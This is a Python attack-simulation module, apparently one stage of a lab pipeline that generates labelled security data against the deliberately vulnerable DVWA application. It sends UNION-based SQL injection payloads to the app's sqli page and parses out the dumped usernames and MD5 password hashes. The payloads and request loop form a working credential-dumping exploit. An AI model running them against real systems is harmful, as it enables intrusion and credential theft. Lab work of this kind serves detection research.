"""
Stage 3 - SQL injection / credential dumping (MITRE TA0006 / T1190)

Targets vulnerabilities/sqli/ at DVWA low security level, where the `id`
GET parameter is concatenated directly into the SQL query. Uses a
UNION-based injection to dump `user` / `password` (MD5 hash) columns from
the `users` table -- a realistic "attacker pivots from web app to full
credential dump" step, and the resulting creds feed narrative-wise into
later stages (documented in the exported dataset, not re-used
automatically, since DVWA's own admin/password are already known to the
lab operator).
"""
import re

import config
from attacks.dvwa_session import DvwaSession, GroundTruth, now_iso

ROW_RE = re.compile(r"First name:\s*(?P<user>[^<]*)<br\s*/?>\s*Surname:\s*(?P<pass>[^<]*)<br\s*/?>", re.IGNORECASE)

PAYLOADS = [
    "1' UNION SELECT user, password FROM users #",
    "1' UNION SELECT null, version() #",
]


def run(dvwa: DvwaSession, gt: GroundTruth) -> dict:
    dumped_rows = []
    with gt.stage("sqli", {"target": "vulnerabilities/sqli/", "payloads": PAYLOADS}):
        for payload in PAYLOADS:
            r = dvwa.get("vulnerabilities/sqli/", params={"id": payload, "Submit": "Submit"})
            gt.note("sqli", "injection request sent", payload=payload,
                    status=r.status_code, timestamp=now_iso())
            rows = [m.groupdict() for m in ROW_RE.finditer(r.text)]
            dumped_rows.extend(rows)
        gt.note("sqli", "dump complete", row_count=len(dumped_rows))
    return {"dumped_rows": dumped_rows}


if __name__ == "__main__":
    dvwa = DvwaSession()
    dvwa.login()
    print(run(dvwa, GroundTruth()))
